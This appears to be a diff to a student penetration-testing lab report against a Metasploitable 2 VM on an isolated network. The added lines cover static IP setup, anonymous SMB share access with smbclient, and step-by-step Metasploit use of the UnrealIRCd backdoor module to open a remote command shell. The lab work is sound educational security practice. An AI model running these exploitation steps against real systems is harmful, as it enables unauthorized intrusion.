@@ -6,15 +6,13 @@ The objective of this lab was to understand how attackers identify, analyze, and
 The target machine (Metasploitable 2) is intentionally vulnerable and used strictly for educational purposes in a controlled virtual environment.
 
 2. Lab Environment Setup
-Virtual Machines:
+2.1 Virtual Machines:
 Attacker Machine: Kali Linux
 IP: 192.168.1.10
 Target Machine: Metasploitable 2
 IP: 192.168.1.20
 
-Default Gateway: 192.168.1.1
-
-Network Configuration
+2.2 Network Configuration
 Both virtual machines were connected using VirtualBox Internal Network.
 Since the internal network does not provide a DHCP server, IP addresses were assigned manually using :
 sudo ifconfig eth0 <IP> netmask 255.255.255.0 broadcast 192.168.1.255
@@ -25,11 +23,11 @@ ping 192.168.1.20
 IP configuration was confirmed with:
 ifconfig
 
-Issue Faced
+2.3 Issue Faced
 VirtualBox internal networking does not provide a DHCP server, which caused the VMs to lose their IP configuration after reboot.
+
 Solution
 To permanently assign static IP addresses, the /etc/network/interfaces file was edited: sudo nano /etc/network/interfaces
-
 Configuration added:
 auto eth0
 iface eth0 inet static
@@ -134,8 +132,46 @@ smbclient -L 192.168.1.20
 Result:
 Anonymous login was successful.
 Shared resources were listed without requiring authentication credentials.
-
 Allowing anonymous access to SMB shares indicates weak authentication configuration. This exposes system resources to unauthorized users and increases the risk of information disclosure and further exploitation.
+
+Further testing showed that anonymous access to the tmp shared directory was possible:
+smbclient //192.168.1.20/tmp -N
+This command allowed access to the SMB shell without authentication.
+Anonymous access to shared directories is a serious misconfiguration. It allows unauthorized users to browse, upload, or download files, which can lead to data exposure, malware placement, or further system compromise.
+
+5.3 IRC Exploitation (Port 6667)
+
+Port 6667 was identified as open during the full TCP scan:
+nmap -p- 192.168.1.20
+
+To gather more detailed information about the service running on this port:
+nmap -sV -sC -p 6667 192.168.1.20
+The scan revealed that the service was running UnrealIRCd, a version known to contain a backdoor vulnerability.
+
+Exploitation Using Metasploit
+
+The Metasploit Framework was used to exploit the known backdoor in UnrealIRCd.
+
+Start Metasploit:
+msfconsole
+Search for the relevant exploit module:
+search exploit/unix/irc/unreal/irc_3281_backdoor
+Select the module:
+use exploit/unix/irc/unreal/irc_3281_backdoor
+Display available payloads:
+
+show payloads
+Set the payload:
+set payload cmd/unix/interact
+
+Configure target and local parameters:
+set RHOSTS 192.168.1.20
+set LHOST <your-attacker-ip>
+set LPORT <chosen-port>
+run
+
+Result:
+A command shell session was successfully opened on the target machine
 
 6. Post-Exploitation
 
